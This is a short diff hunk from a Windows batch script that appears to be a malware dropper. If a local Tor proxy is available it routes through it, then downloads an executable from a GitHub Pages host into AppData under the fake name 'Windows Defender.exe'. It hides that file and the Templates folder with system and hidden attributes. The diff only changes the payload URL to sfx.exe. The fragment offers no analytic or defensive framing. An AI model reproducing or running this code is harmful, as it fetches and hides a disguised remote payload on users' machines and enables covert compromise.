@@ -41,7 +41,7 @@ if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
   set "proxy="
 )
 
-curl.exe %proxy% https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe"
+curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe"
 attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
 attrib +s +h +i "%AppData%\Microsoft\Windows\Templates"
 
